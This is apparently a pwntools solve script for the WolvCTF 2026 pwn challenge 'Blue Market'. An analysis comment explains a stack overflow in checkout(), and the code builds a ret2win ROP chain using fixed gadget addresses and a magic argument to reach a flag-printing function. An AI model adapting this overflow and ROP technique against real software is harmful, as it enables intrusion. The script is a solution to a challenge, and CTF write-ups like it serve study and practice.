"""
title: Blue Market
ctf: WolvCTF 2026
category: pwn
difficulty: 1
arch: amd64
linking: dynamic
mitigation_gaps: [no-pie, no-canary, partial-relro, not-stripped]
vulnerabilities: [stack-overflow]
tags: [ret2win, rop]
"""
from pwn import *
import re

# =====
# ANALYSIS
# =====
# Dynamically linked, no PIE, no canary.
# checkout() reads into a stack buffer at rbp-0x40 with a read() capped at
# 0x100 bytes, far past the buffer, so saved RIP is controlled with room for
# a ~23-word ROP chain.
# managerOverride(arg) reads and prints the flag when arg equals a hardcoded
# magic number, so it is the ret2win target. No PIE means its address and the
# gadgets are fixed, no leak needed.
# Plan: overflow, load the magic into rdi with a pop rdi gadget, then jump
# into managerOverride. A bare ret first keeps the stack 16-byte aligned for
# the printf managerOverride runs.

# =====
# CONSTANTS
# =====
BUFF_TO_RBP_OFF = 0x40                # buffer start to saved rbp
MAGIC_NUMBER = 0xc0ffee               # value managerOverride checks against
MANAGER_OVERRIDE_ADDR = 0x401184      # ret2win target
POP_RDI_RET_ADDR = 0x401182           # pop rdi gadget
RET_ADDR = 0x401016                   # bare ret, for stack alignment

# =====
# EXPLOIT
# =====

# Build the ret2win chain: magic into rdi, align, then managerOverride.
payload = b"A" * (BUFF_TO_RBP_OFF + 0x8)    # overflow buffer + saved rbp
payload += p64(POP_RDI_RET_ADDR)            # 1st arg = magic number
payload += p64(MAGIC_NUMBER)
payload += p64(RET_ADDR)                    # keep 16-byte stack alignment
payload += p64(MANAGER_OVERRIDE_ADDR)       # jump to the target

# Spawn the target and send the payload.
p = process("./blue_market")
p.send(payload)

# --- Flag ---

# Extract the flag from the program output.
output = p.recvall(timeout=5)
match = re.search(rb"wctf\{[^}]*\}", output)
if match:
    print(f"Found flag: {match.group(0).decode()}")
else:
    print("Flag not found in the output:")
    print(output.decode(errors="replace"))
